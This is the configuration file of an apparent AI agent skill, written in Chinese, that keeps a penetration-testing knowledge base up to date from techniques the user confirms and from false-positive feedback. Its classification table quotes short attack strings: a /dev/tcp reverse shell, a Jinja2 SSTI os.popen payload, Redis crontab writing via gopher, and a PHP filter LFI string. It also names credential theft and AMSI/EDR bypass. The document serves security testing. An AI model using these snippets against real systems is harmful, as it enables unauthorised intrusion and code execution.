---
name: skill-evolver
description: >
  渗透技能持续进化系统 v1.0.0。在日常渗透测试工作中自动沉淀确认有效的技术、
  Payload、工具用法和绕过手法，持续改进 SecSkills-main / advsec-plus / api-unauth-fuzz
  等已有技能的知识库。覆盖：信息收集、暴露面梳理、资产收集、Top10漏洞挖掘、
  内网穿透、横向移动、权限提升、免杀规避等全领域。
  当用户确认某个技术有效或要求"记住这个"时自动触发改进流程。
  也记录"误报/无用漏洞"的负向反馈，避免重复踩坑。
allowed-tools: Read, Write, Bash, Grep, WebFetch, WebSearch, Glob, AskUserQuestion, Edit
argument-hint: <要记录的技术/命令/技巧 | 命令: remember|dismiss|suppress|why-not|evolve|status|update-skill|review|gaps>
---

# 渗透技能持续进化系统 (Skill Evolver)

> **核心理念**: 
> - **正向进化**: 你每次实战中确认有效的技术，都应该成为技能的一部分
> - **负向进化**: 你指出"这个漏洞没用/误报"，同样要记住——避免下次再报同样的问题
> - **双向闭环**: 对的有用 → 沉淀；错的无用 → 规避
>
> **架构**: SKILL.md (L1) → references/ (L2) → 已有技能参考文件 (L3 目标)
> **进化循环**: 实战确认 → 结构化记录 → 差距分析 → 更新参考文件 → 下次自动可用

---

## 1. 触发条件

### 🔵 自动触发 (任一满足)
当用户表达以下意图时自动触发本 Skill:

| 触发语 | 示例 |
|--------|------|
| "记住这个技巧/命令/Payload" | "记住这个JWT的kid注入payload" |
| "这个有效/管用/好用" | "这个AMSI绕过手法有效" |
| "记录一下" | "记录一下这个内网穿透命令" |
| "更新到技能里" | "把这个SQL注入绕过更新到技能里" |
| "改进一下" | "改进一下信息收集的部分" |
| "这个技巧应该加到技能中" | "这个隐蔽隧道应该加到技能中" |
| "以后记住用这个" | "以后记住用这个凭据窃取方法" |

### 🔴 负向反馈触发 (新增——关键！)
当用户指出我报的漏洞/技术/结果有问题时自动触发:

| 触发语 | 含义 | 示例 |
|--------|------|------|
| "这个没用/没价值/无意义" | 漏洞虽存在但业务上不可利用 | "这个self-XSS没用" |
| "误报/不是漏洞/错的" | 检测方法有问题，不是真实漏洞 | "这个SQL注入是误报" |
| "这个我早就知道了/没有新意" | 信息收集结果不新鲜 | "这个子域名扫描结果都是常识" |
| "这个条件太苛刻/不可能满足" | 利用条件不现实 | "这个RCE需要管理员点击链接，不可能" |
| "这个场景不适用/实际情况不一样" | 检测场景不符合实战 | "这个SSRF目标不出网，你的payload没用" |
| "以后别报这个了/这类型忽略" | 永久屏蔽某类检测 | "以后别报这个低危信息泄露了" |
| "这个漏洞报告不准确/定级不对" | 严重程度或影响范围判断错误 | "这个只是信息泄露，你标成高危了" |

> ⚠️ **负向反馈和被拒是不同的**：
> - 工具被拒 → 用户点了"拒绝"，是权限问题，不用学
> - 负向反馈 → 用户说"这个结果不对/没用"，**这是最重要的进化信号**

### 🟡 被动触发
当用户在渗透测试过程中提供反馈时:
- 指出某个参考文件内容有误 → 触发修正流程
- 提供更优的 Payload/命令 → 触发更新流程
- 指出某个步骤遗漏了关键环节 → 触发补充流程

### ⚪ 手动触发 (命令模式)

| 命令 | 功能 |
|------|------|
| `/skill-evolver remember <内容>` | 直接记录一个确认有效的技术 |
| `/skill-evolver dismiss <漏洞描述>` | 标记某个漏洞/结果为"无用"并记录原因 |
| `/skill-evolver suppress <类型/模式>` | 永久屏蔽某类检测结果 |
| `/skill-evolver status` | 查看进化状态和统计(含误报统计) |
| `/skill-evolver evolve <领域>` | 触发指定领域的进化分析 |
| `/skill-evolver update-skill <技能名> <领域>` | 手动更新某个技能的参考文件 |
| `/skill-evolver review` | 审查待处理的进化建议 |
| `/skill-evolver gaps [领域]` | 分析现有技能的知识盲区 |
| `/skill-evolver why-not <技术>` | 查看某个技术之前被标记为"无用"的原因 |

---

## 2. 行为准则

1. ❗ **实战优先** — 只记录经过实战验证的技术，不记录理论推测
2. ❗ **引用溯源** — 每条记录标注来源: 实战日期、目标类型、是否授权
3. ❗ **去重检查** — 写入前检查目标技能参考文件是否已覆盖，避免冗余
4. ❗ **格式统一** — 追加的内容必须与目标参考文件的现有格式保持一致
5. ❗ **安全红线** — 不记录破坏性操作（删数据/DoS/持久后门）的具体步骤
6. ❗ **更新通知** — 每次更新技能文件后输出变更摘要: `✅ [技能] [文件] [变更内容]`

---

## 3. 进化工作流

### 3.1 核心进化循环

```
用户确认技术有效
       │
       ▼
  ┌─ Step 1: 技术解析 ──────────────────────┐
  │  解析用户输入 → 分类(领域/漏洞/阶段) →   │
  │  提取关键内容(Payload/命令/步骤)          │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step 2: 结构化记录 ──────────────────────┐
  │  写入 techniques.db.md                    │
  │  • 技术名称 + 类别标签                     │
  │  • 详细内容 + 命令/Payload                │
  │  • 适用条件 + 注意事项                    │
  │  • 实战来源 + 验证日期                    │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step 3: 差距分析 ───────────────────────┐
  │  检查目标技能参考文件是否已覆盖             │
  │  • 已覆盖且内容一致 → 标记已验证           │
  │  • 已覆盖但内容不完整 → 标记待更新         │
  │  • 未覆盖 → 标记待新增                    │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step 4: 技能改进 ───────────────────────┐
  │  • 新增: 在目标参考文件中追加新章节         │
  │  • 更新: 扩展现有章节的内容                │
  │  • 修正: 修复错误或不准确的内容             │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step 5: 进化记录 ───────────────────────┐
  │  写入 evolution-log.md                    │
  │  输出变更摘要给用户                       │
  └──────────────────────────────────────────┘
```

### 3.2 领域分类体系

所有确认的技术按以下多维分类体系组织:

#### 按渗透阶段
```
阶段A: 信息收集与暴露面梳理
  ├─ A1: 域名/子域名枚举
  ├─ A2: 端口扫描与服务识别
  ├─ A3: 目录/文件爆破
  ├─ A4: Web指纹识别
  ├─ A5: 关联资产发现 (C段/ASN/证书)
  ├─ A6: 社会工程学/OSINT
  └─ A7: 前端分析 (JS/Source Map)

阶段B: 资产收集与攻击面管理
  ├─ B1: 自动化资产发现
  ├─ B2: 云资产枚举 (Bucket/DB/Function)
  ├─ B3: API 接口发现
  ├─ B4: 供应链资产 (Git/CI-CD/Deps)
  ├─ B5: 移动端资产
  └─ B6: 暴露面分级排序

阶段C: 漏洞挖掘 (Top 10 持续进化)
  ├─ C1: SQL 注入 (联合/报错/盲注/绕过/OOB)
  ├─ C2: XSS (反射/存储/DOM/CSP绕过)
  ├─ C3: RCE/命令执行 (回显/盲执行/反弹)
  ├─ C4: SSRF (内网/云/Gopher/Redis)
  ├─ C5: 文件上传 (后缀/内容/条件竞争)
  ├─ C6: 文件包含/LFI (伪协议/日志投毒)
  ├─ C7: XXE (文件读取/Blind/OOB)
  ├─ C8: 反序列化 (PHP/Java/Python)
  ├─ C9: 越权/逻辑漏洞 (IDOR/支付/密码重置)
  └─ C10: SSTI (Jinja2/Twig/FreeMarker)

阶段D: 内网穿透与隧道
  ├─ D1: 代理隧道 (HTTP/Socks5/DNS/ICMP)
  ├─ D2: 端口转发 (Ligolo/FRP/Chisel/SSH)
  ├─ D3: 反弹Shell 升级 (PTY/Encoder)
  ├─ D4: 隐蔽信道 (DNS/HTTPS/ICMP)
  └─ D5: 代理链与路由

阶段E: 横向移动
  ├─ E1: Pass-the-Hash/Pass-the-Ticket
  ├─ E2: WMI/WinRM/PsExec 横向
  ├─ E3: SSH 横向
  ├─ E4: 容器/K8s 横向
  ├─ E5: 域渗透 (Kerberoast/AS-REP/DCSync)
  └─ E6: 云环境横向

阶段F: 权限提升
  ├─ F1: Linux 提权 (SUID/Capabilities/Kernel)
  ├─ F2: Windows 提权 (Token/Potato/Kernel)
  ├─ F3: 容器逃逸
  └─ F4: 云权限提升

阶段G: 免杀与规避
  ├─ G1: Shellcode 混淆
  ├─ G2: 加载器技术
  ├─ G3: EDR/AV 绕过
  ├─ G4: AMSI/ETW 绕过
  ├─ G5: 流量混淆
  └─ G6: 持久化规避

阶段H: API 与移动安全
  ├─ H1: JWT 攻击
  ├─ H2: OAuth/OIDC 配置错误
  ├─ H3: Android 渗透
  ├─ H4: iOS 渗透
  ├─ H5: gRPC/WebSocket
  └─ H6: GraphQL 攻击

阶段I: 云安全
  ├─ I1: 云元数据利用
  ├─ I2: 对象存储泄露
  ├─ I3: K8s 渗透
  └─ I4: Serverless 安全

阶段J: 供应链安全
  ├─ J1: Git 泄露
  ├─ J2: 依赖混淆
  ├─ J3: CI/CD 渗透
  └─ J4: 密钥硬编码
```

---

### 3.3 负向进化工作流（误报/无用漏洞处理）

```
用户指出: "这个漏洞没用 / 误报 / 条件不现实"
       │
       ▼
  ┌─ Step N1: 反馈解析 ────────────────────┐
  │  解析用户反馈，识别:                      │
  │  • 是误报(false positive)                │
  │  • 还是真实漏洞但无利用价值               │
  │  • 还是检测条件/场景不对                  │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step N2: 根因分析 ────────────────────┐
  │  分析为什么会报出这个"无用"结果:          │
  │  • 检测逻辑有漏洞 → 更新检测方法          │
  │  • 缺失前置条件判断 → 补充前提条件        │
  │  • 定级过高 → 修正风险等级               │
  │  • 场景不匹配 → 增加场景限制条件          │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step N3: 技能修正 ────────────────────┐
  │  更新目标参考文件:                       │
  │  • 在检测方法旁加 ⚠️ 误报提醒            │
  │  • 补充前置条件检查步骤                  │
  │  • 修正漏洞定级                         │
  │  • 增加"不适用场景"说明                  │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step N4: 记录黑名单 ──────────────────┐
  │  写入 false-positives.db.md:            │
  │  • 漏洞模式 + 误报原因                   │
  │  • 下次遇到类似模式 → 先查黑名单          │
  │  • 输出"⏭ 已跳过: 用户之前标记过类似情况" │
  └──────────────────────────────────────────┘
       │
       ▼
  ┌─ Step N5: 进化记录 ────────────────────┐
  │  写入 evolution-log.md                  │
  │  输出修正确认给用户                     │
  └──────────────────────────────────────────┘
```

### 3.4 正负向平衡原则

| 维度 | 正向技术 | 负向反馈 |
|------|---------|---------|
| 更新粒度 | 新增/扩充参考内容 | 增加前置条件/修正判断逻辑 |
| 影响范围 | 扩大检测覆盖面 | 精确认定范围，减少噪音 |
| 优先级 | 中（持续积累） | **高（立刻避免下次再犯）** |
| 用户预期 | "下次可以用这个" | "下次不会再报这个了" |
| 参考文件操作 | 追加 `✅ skill-evolver` | 追加 `⚠️ 已知误报` / `❌ 不适用场景` |

## 4. 命令详解

### 4.1 `/skill-evolver remember <内容>`

直接记录一个确认有效的技术。

**输入格式**: 自由文本，系统自动解析

**示例**:
```
用户: /skill-evolver remember 发现某目标存在Spring Actuator未授权，通过/heapdump下载内存快照，用jadx分析出数据库密码，手动复现确认有效
→ 系统自动解析: 阶段=B(资产收集), 类别=B3(API发现)/C9(越权), 涉及技能=SecSkills-main
→ 记录到 techniques.db.md
→ 检查 SecSkills-main/references/web-auth-logic.md 是否有heapdump相关内容
→ 如未覆盖 → 更新该文件
→ 输出确认
```

```
用户: 记住这个IIS短文件名泄露的利用方法，dir /s /a /b C:\inetpub\*~1*
→ 系统自动解析: 阶段=A(信息收集), 类别=A3(目录爆破), 涉及技能=SecSkills-main
→ 记录并更新 info-dir-brute.md 或其他合适文件
```

### 4.2 `/skill-evolver dismiss <漏洞/结果描述>`

标记某个漏洞或结果为"无用"，记录原因并更新技能文件。

**示例**:
```
用户: /skill-evolver dismiss self-XSS，需要用户点击才触发，实际场景无法利用
→ 系统: 解析到漏洞类型=self-XSS, 原因=利用条件苛刻
→ 记录到 false-positives.db.md
→ 更新 SecSkills-main/references/web-xss.md §1 增加 ⚠️ 注意: self-XSS 需要用户交互，实战中优先级低
→ 输出: ✅ 已记录self-XSS误报，下次检测时会自动降级为🟢低危 + 标注利用条件
```

```
用户: /skill-evolver dismiss 目标存在目录列出漏洞，但这是业务设计如此
→ 系统: 解析到原因=业务行为不是漏洞
→ 记录到 false-positives.db.md
→ 更新 SecSkills-main/references/web-dir-traversal.md 增加 ⚠️ 目录列出可能是业务需求
→ 输出: ✅ 已记录，下次会先检测是否为静态资源目录再定级
```

**处理矩阵**:

| 用户反馈 | 根本原因 | 系统动作 |
|---------|---------|---------|
| "这个没用" | 漏洞真实存在但不可利用 | 降级漏洞 + 标注利用条件 |
| "这不是漏洞/误报" | 检测逻辑误判 | 修复检测方法 + 标记已知误报 |
| "条件太苛刻" | 缺少前置条件检查 | 增加条件检查步骤 |
| "我早就知道了" | 信息收集缺乏新意过滤 | 增加已知/常见资产过滤 |
| "场景不适用" | 检测和实际环境不匹配 | 增加场景匹配规则 |

### 4.3 `/skill-evolver suppress <类型/模式>`

永久屏蔽某类检测结果，直到用户手动解除。

**示例**:
```
用户: /skill-evolver suppress 信息泄露-低危
→ 系统: 所有低危信息泄露不再报告，仅记录到完整报告
→ 输出: ⏭️ 已屏蔽: [信息泄露-低危]，可随时用 /skill-evolver unsuppress 恢复
```

```
用户: /skill-evolver suppress 备用域名*.old-*.com
→ 系统: 所有匹配 *.old-*.com 的域名不再显示在子域名结果中
```

### 4.4 `/skill-evolver why-not <技术/漏洞>`

查看某个技术或漏洞之前被标记为"无用"的原因。

**示例**:
```
用户: /skill-evolver why-not self-xss
→ 系统: ⏭️ 该漏洞类型 [self-xss] 于 2026-05-20 被标记为"不适用"
   原因: 需要用户主动点击链接才能触发，实战中无法利用
   标记人: 你
   涉及文件: SecSkills-main/references/web-xss.md §1.2
```

### 4.5 `/skill-evolver status`

查看进化状态概览:

```
📊 Skill Evolver 状态
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 正向进化:
   已记录技术:        47
      ├─ 已验证:       38
      └─ 待更新:        9
   已有技能改进次数:   23
      ├─ SecSkills-main:   15
      ├─ advsec-plus:       6
      └─ api-unauth-fuzz:   2

📉 负向进化 (误报/无用):
   已标记误报:        12
      ├─ false positive:    5
      ├─ 无法利用:          4
      └─ 场景不匹配:        3
   已屏蔽检测类型:     2
   已修正检测逻辑:     7
   避免的重复误报:     ≈估算 15+ 次

📋 其他:
   知识盲区待补充:    12
   最后进化:          2026-06-05 14:30
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### 4.6 `/skill-evolver evolve <领域|阶段>`

触发指定领域的进化分析 — 检查该领域下所有待处理技术并批量更新。

**示例**:
```
/skill-evolver evolve C  → 分析SQL注入领域的待更新技术
/skill-evolver evolve D  → 分析内网穿透领域的待更新技术
/skill-evolver evolve    → 分析所有领域
```

### 4.7 `/skill-evolver update-skill <技能名> <领域|文件>`

手动更新某个技能的特定参考文件。

**示例**:
```
/skill-evolver update-skill SecSkills-main web-sqli
  → 将所有SQL注入相关的新技术更新到 web-sqli.md

/skill-evolver update-skill advsec-plus references/api-security.md
  → 将所有API安全相关的新技术更新到 api-security.md
```

### 4.8 `/skill-evolver review`

审查待处理的进化建议 — 列出所有已记录但尚未整合到技能中的技术，让用户选择哪些需要更新。

### 4.9 `/skill-evolver gaps [领域]`

分析现有技能的知识盲区。基于已记录的技术 vs 已有参考文件的覆盖情况，输出未覆盖的领域列表。

---

## 5. 技能集成映射

本技能通过以下映射表将确认的技术路由到正确的目标技能文件:

| 技术领域 | 目标技能 | 目标参考文件 |
|---------|---------|-------------|
| 端口扫描/服务识别 | SecSkills-main | `references/info-port-scan.md` |
| 子域名枚举 | SecSkills-main | `references/info-subdomain.md` |
| 目录爆破 | SecSkills-main | `references/info-dir-brute.md` |
| Web指纹/OSINT | SecSkills-main | `references/info-fingerprint.md`, `references/info-osint.md` |
| SQL注入 | SecSkills-main | `references/web-sqli.md` |
| XSS | SecSkills-main | `references/web-xss.md` |
| RCE/命令执行 | SecSkills-main | `references/web-rce.md` |
| SSRF | SecSkills-main | `references/web-ssrf.md` |
| 文件上传 | SecSkills-main | `references/web-upload.md` |
| 文件包含/LFI | SecSkills-main | `references/web-lfi-path.md` |
| 目录遍历 | SecSkills-main | `references/web-dir-traversal.md` |
| XXE | SecSkills-main | `references/web-xxe.md` |
| 反序列化 | SecSkills-main | `references/web-deser.md` |
| 越权/逻辑 | SecSkills-main | `references/web-auth-logic.md` |
| 竞争条件 | SecSkills-main | `references/web-race-condition.md` |
| SSTI | SecSkills-main | `references/web-ssti.md` |
| HTTP请求走私 | SecSkills-main | `references/web-http-smuggling.md` |
| Host头注入 | SecSkills-main | `references/web-host-header.md` |
| 缓存投毒 | SecSkills-main | `references/web-cache-poison.md` |
| CORS | SecSkills-main | `references/web-cors.md` |
| CRLF | SecSkills-main | `references/web-crlf.md` |
| GraphQL | SecSkills-main | `references/web-graphql.md` |
| WAF绕过 | SecSkills-main | `references/web-waf-bypass.md` |
| 密码爆破 | SecSkills-main | `references/host-brute.md` |
| Linux提权 | SecSkills-main | `references/post-linux-privesc.md` |
| Windows提权 | SecSkills-main | `references/post-win-privesc.md` |
| 凭据窃取+横向 | SecSkills-main | `references/post-credentials.md` |
| 域渗透 | SecSkills-main | `references/post-ad.md` |
| Shellcode/免杀 | SecSkills-main | `references/evasion-shellcode.md` |
| 工具:Nmap | SecSkills-main | `references/tools-nmap.md` |
| 工具:SQLMap | SecSkills-main | `references/tools-sqlmap.md` |
| 工具:MSF | SecSkills-main | `references/tools-msf.md` |
| 工具:Hydra | SecSkills-main | `references/tools-hydra.md` |
| 工具:Impacket | SecSkills-main | `references/tools-impacket.md` |
| 工具:ffuf/gobuster | SecSkills-main | `references/tools-fuzz.md` |
| JWT/OAuth/API | advsec-plus | `references/api-security.md` |
| 移动端安全 | advsec-plus | `references/mobile-security.md` |
| 云安全/容器/K8s | advsec-plus | `references/cloud-security.md` |
| 供应链/Git/CI-CD | advsec-plus | `references/supply-chain-devsec.md` |
| 现代Web漏洞 | advsec-plus | `references/web-advanced.md` |
| EDR/AMSI/Syscall | advsec-plus | `references/evasion-advanced.md` |
| API未授权测试 | api-unauth-fuzz | `skill.md` |

---

## 6. 进化分析引擎

### 6.1 自动分类规则

当用户确认一个技术时，系统根据关键词自动分类:

| 关键词 → 阶段 | 示例输入 |
|--------------|---------|
| `port scan|nmap|masscan|端口` → A2 | "masscan --rate=10000 端口扫描很快" |
| `subdomain|子域名|dns` → A1 | "subfinder + httpx 组合很稳" |
| `dir|目录|gobuster|ffuf` → A3 | "ffuf -w wordlist:FUZZ 递归扫描挺好用" |
| `sqlmap|sql注入|sqli` → C1 | "sqlmap --tamper=space2comment 过WAF" |
| `xss|csp` → C2 | "这个XSS绕过CSP的payload有效" |
| `rce|反弹|shell|命令执行` → C3 | "bash -i >& /dev/tcp/x/x 反弹不行，试试python" |
| `ssrf|gopher|redis` → C4 | "SSRF通过gopher协议打Redis写crontab" |
| `upload|文件上传` → C5 | ".phtml 后缀在nginx下被解析" |
| `lfi|文件包含|日志投毒` → C6 | "php://filter/convert.base64-encode/resource=" |
| `xxe|xinclude` → C7 | "XXE OOB 通过ftp外带数据" |
| `反序列化|deser|ysoserial` → C8 | "ysoserial JRMPClient 配合JRMPListener" |
| `idor|越权|逻辑漏洞` → C9 | "修改user_id参数越权查看其他用户订单" |
| `ssti|模板注入|jinja` → C10 | "Jinja2 SSTI {{lipsum.__globals__.os.popen('id')}}" |
| `内网|隧道|frp|chisel|代理` → D | "chisel client连接server做socks5代理" |
| `横向|pth|wmi|winrm` → E | "crackmapexec winrm 配合pth横向" |
| `提权|suid|土豆|token` → F | "PrintSpoofer 提权很稳" |
| `免杀|shellcode|加载器` → G | "Donut 加载.NET程序集做shellcode" |
| `jwt|oauth|token` → H | "JWT none签名算法绕过" |
| `云|oss|s3|k8s|容器` → I | "kubectl exec -it pod -- /bin/bash 进容器" |
| `git泄露|依赖混淆` → J | "GitHacker 恢复.git目录" |

### 6.2 操作映射

根据差距分析结果，执行具体的文件操作:

| 差距类型 | 操作 | 说明 |
|---------|------|------|
| **新增** | 在目标文件末尾追加新section | `### §N+1: [技术名]\n...\n` |
| **扩展现有** | 在现有section中追加新内容 | `<!-- ✅ skill-evolver 追加 -->\n...\n` |
| **修正** | 替换或更新现有内容 | 保持原结构，更新过时的命令/版本 |
| **合并** | 多个类似技术合并为一张表格 | 减少冗余，方便查阅 |
| **提升优先级** | 将已验证的技术移至更靠前的位置 | 实战效率优化 |

---

## 7. 零结果处理

| 情况 | 动作 |
|------|------|
| 用户确认的技术已完全覆盖 | `✅ 该技术已在 [文件] §[章节] 中覆盖` |
| 内容不清晰无法解析 | `❓ 无法解析，请提供更具体的命令/Payload` |
| 目标参考文件不存在 | `⚠️ 目标文件不存在，创建新文件 [文件名]` |
| 与现有内容有冲突 | `⚠️ 与现有内容有冲突，请确认: [差异对比]` |
| 无权限修改目标技能文件 | `❌ 无写入权限，记录到待处理列表` |
| 用户要求记录的内容过于宽泛 | `❓ 建议缩小范围到具体的命令/Payload/步骤` |

### 负向反馈专项处理

| 情况 | 动作 |
|------|------|
| 用户说"这个漏洞没用" | `📉 已记录误报: [类型]，更新参考文件加上⚠️前置条件` |
| 用户说"误报" | `🔍 分析检测逻辑 → 修复 → ✅ 下次不会再报` |
| 用户说"屏蔽这类" | `⏭️ 已永久屏蔽: [类型]，/skill-evolver unsuppress 恢复` |
| 用户说"场景不适用" | `🎯 增加场景匹配规则 → 下次自动跳过不适用的检测` |
| 用户只是想反馈但不确定是否误报 | `❓ 请确认: 这是(1)误报 (2)无法利用 (3)场景不匹配 (4)其他` |

---

## ⚠️ 跨技能漏洞验证与输出强制规范（所有技能必须遵守）

> 以下规范由 skill-evolver 定义，**所有渗透测试技能 (SecSkills-main / advsec-plus / api-unauth-fuzz) 必须强制执行**。
> 违反规范的漏洞输出视为违规操作。

---

### 🔴 规范一：禁止输出未核实漏洞

| 规则 | 说明 |
|------|------|
| **未验证的漏洞 = 不存在** | 所有漏洞必须有可复现的验证请求/PoC 才能输出 |
| **不确定性必须标注** | 无法100%确认 → 标注 `❓ 待验证: [原因]`，不作为正式漏洞 |
| **不允许"可能/也许/疑似"** | 如果只有"疑似"证据 → 输出验证请求让用户测，不直接报漏洞 |
| **边界情况** | 检测发现"可能存在SQL注入"但报错不明确 → 输出验证请求，不直接输出"存在SQL注入" |

输出格式（无核实）:
```
❓ 待验证: 可能存在的漏洞类型
   检测依据: [检测命令/请求及响应]
   验证请求: [curl命令，可直接粘贴到Burp Repeater]
   状态: ⚠️ 未验证，待你确认
```

---

### 🔴 规范二：漏洞必须附带可复现的验证请求

每个已确认漏洞的输出必须包含:

```
📦 漏洞标题
   ├─ 类型: [漏洞分类]
   ├─ 风险: [🔴/🟡/🟢]
   ├─ 位置: [完整URL/文件路径]
   ├─ 验证请求: (必须) ← 用户要在Burp里手动验证
   │   curl -sk 'https://target.com/api/vuln' \
   │     -H 'Cookie: ...' \
   │     -d '{"key":"value"}'
   ├─ 验证响应: [关键响应片段，证明漏洞存在]
   ├─ 利用条件: [如果有]
   └─ 状态: ✅ 已验证 (你确认后)
```

**验证请求要求**:
1. **必须是完整的 curl 命令** — 包含所有 Headers/Cookies/Body，用户可直接复制到 Burp Repeater
2. **不能省略关键请求头** — Cookie、Authorization、Content-Type 必须包含
3. **请求必须能直接复现** — 不需要用户再自行构造，复制即用
4. **必须包含预期响应特征** — 告诉用户"响应包含XXX内容即为漏洞存在"

---

### 🔴 规范三：JS硬编码/敏感信息/未授权 → 完整路径+位置

| 漏洞类型 | 输出要求 |
|---------|---------|
| JS文件中硬编码的密钥/Token/密码 | 完整JS文件URL + 具体代码行号 + 前后文 |
| 代码仓库中的硬编码敏感信息 | 文件完整路径 + 行号 + 泄露的值(脱敏) |
| 未授权访问泄露敏感信息 | 完整请求URL + 参数 + 响应中敏感字段路径 |
| .git/config 等配置文件泄露 | 完整URL + 下载方式 |
| Swagger/API文档泄露 | 完整URL + 暴露的接口列表 |

**输出格式**:
```
📦 敏感信息泄露
   ├─ 位置: https://target.com/static/js/app.js:284
   ├─ 泄露内容:
   │   // Line 284: const API_SECRET = "sk-xxx...xxx"
   │   // Line 285-290: (前后文)
   ├─ 来源: [JS文件] [配置文件] [响应体]
   ├─ 验证请求:
   │   curl -sk 'https://target.com/static/js/app.js' | grep -n 'API_SECRET'
   └─ 状态: ✅ 已验证
```

---

### 🔴 规范四：漏洞输出禁止清单

| 禁止行为 | 示例 | 正确的做法 |
|---------|------|-----------|
| ❌ 输出"可能/疑似/也许有漏洞" | "目标可能存在SQL注入" | 输出验证请求，待用户确认 |
| ❌ 不输出完整请求 | "用工具扫一下/sqli" | 给出完整 curl 命令 |
| ❌ JS泄露只给URL不给行号 | "JS文件中有密钥" | JS文件URL + 行号 + 泄露值 |
| ❌ 未授权不给完整响应 | "返回了敏感数据" | 完整响应中敏感数据片段 |
| ❌ 推测性定级 | "可能是高危" | 标注待验证，不正式定级 |
| ❌ 只给工具名不给具体命令 | "用nmap扫一下" | 完整的nmap命令 + 参数 |

---

## 8. 安全红线

1. 🚫 不记录破坏性操作（大规模删除/DoS/格式化）的具体步骤
2. 🚫 不记录未经授权的渗透测试方法和工具链
3. 🚫 不修改技能的触发条件和核心工作流（只更新参考内容）
4. 🚫 不在参考文件中插入未经实战验证的理论内容
5. ✅ 每次更新必须标注 `<!-- ✅ skill-evolver YYYY-MM-DD -->` 标记

---

## 9. 路由边界

| 诉求 | 路由 |
|------|------|
| 记录一个新技巧/Payload | **本 Skill** |
| 更新现有技能的参考文件 | **本 Skill** |
| 查看进化统计 | **本 Skill** |
| 分析知识盲区 | **本 Skill** |
| 实际执行渗透测试 | SecSkills-main |
| API/移动/云安全测试 | advsec-plus |
| API未授权模糊测试 | api-unauth-fuzz |
| 蓝队防御/应急响应 | 普通问答 |
| 查CVE/文档 | WebSearch |

---

## 10. 快速上手指南

### 首次使用

```
1. 日常渗透测试时，用 /skill-evolver remember 记录有效技术
2. 定期执行 /skill-evolver evolve 整合新知识到技能
3. 用 /skill-evolver status 查看进化进展
4. 用 /skill-evolver gaps 发现知识盲区
```

### 典型场景

**场景1: 实战中发现新技巧**
```
你: "这个JWT的kid目录遍历获取私钥的有效"
→ skill-evolver 自动检测到 "JWT" + "有效" 
→ 解析: 阶段=H1, 目标技能=advsec-plus, 目标文件=references/api-security.md
→ 记录到 techniques.db.md
→ 更新 api-security.md §1.4 (JWT kid注入章节)
→ 输出: ✅ advsec-plus/api-security.md 已更新，新增 JWT kid目录遍历利用方法
```

**场景2: 发现已有技能知识过时**
```
你: "SecSkills-main 里的SQL注入payload太老了，加几个新的"
→ /skill-evolver update-skill SecSkills-main web-sqli
→ 检查 techniques.db.md 中所有SQL注入相关记录
→ 批量更新 web-sqli.md
→ 输出变更日志
```

**场景3: 某技巧试了多次都失败**
```
你: "这个EDR绕过方法不太对，需要修正"
→ skill-evolver 检测到修正反馈
→ 标记原技术为"待修正"
→ 请求用户提供正确的版本
→ 更新 reference 文件
```

**场景4: 指出我报的漏洞没用/误报** (新的关键场景)
```
你: "你报的这个 self-XSS 没用，需要用户点击才触发，实战谁点啊"
→ skill-evolver 检测到负向反馈 "没用" + "XSS"
→ 解析: 领域=C2(XSS), 原因=利用条件苛刻(需用户交互)
→ 记录到 false-positives.db.md
→ 更新 SecSkills-main/references/web-xss.md §1.2:
   追加 ⚠️ 注意: self-XSS 需要用户主动交互，实战中除非结合其他漏洞否则标注🟢低危
→ 下次再检测到 self-XSS 时 → 自动降级为🟢低危 + 标注"需用户交互"
→ 输出: ✅ 已学习！下次同类问题会先评估利用条件再定级
```

```
你: "这个目录列出不是漏洞，这是业务故意开的cdn目录"
→ skill-evolver 检测到负向反馈 "不是漏洞" + "目录列出"
→ 解析: 领域=A3(目录爆破), 原因=业务行为非漏洞
→ 记录到 false-positives.db.md
→ 更新 SecSkills-main/references/web-dir-traversal.md
   追加 ⚠️ 已知场景: 部分CDN/静态资源目录的目录列出为业务需求
→ 输出: ✅ 已学习！后续对静态资源目录不再报目录列出漏洞
```

---

> *v1.0.0 | Skill Evolver | 持续进化渗透技能体系 | 记录 → 分类 → 整合 → 改进*
